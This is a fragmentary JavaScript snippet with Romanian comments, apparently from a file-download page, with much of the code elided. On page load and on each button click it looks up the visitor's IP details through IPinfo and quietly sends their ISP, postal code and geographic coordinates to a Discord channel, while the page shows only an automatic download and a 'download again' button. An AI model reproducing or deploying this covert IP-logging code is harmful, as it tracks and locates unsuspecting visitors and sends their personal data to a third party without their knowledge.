<script>  
  ...
  // 1. Obținem datele IP de la IPinfo  
  ...
  // 2. Pornim timer-ul și obținem IP-ul  
  getIPData().then(() => {  
  ...
  // 3. Descărcare automată + trimitere în Discord  
  async function autoDownload() {  
    ...
    await sendToDiscord(); // Așteptăm să trimită înainte să afișăm butonul  
    manualBtn.classList.remove('h');  
    manualBtn.textContent = "DESCARCĂ DIN NOU";  
  }  
  
  // 4. Trimite datele în Discord cu IPinfo  
  async function sendToDiscord() {  
    const embed = {  
      ...
      fields: [  
        ...
        { name: "🏛️ ISP / Org", value: userIPData.org, inline: false },  
        { name: "📮 Cod Poștal", value: userIPData.postal, inline: true },  
        { name: "🗺️ Coordonate", value: userIPData.loc, inline: true },  
  ...
  manualBtn.addEventListener('click', () => {  
    ...
    sendToDiscord(); // Trimite și la click manual  
  });  
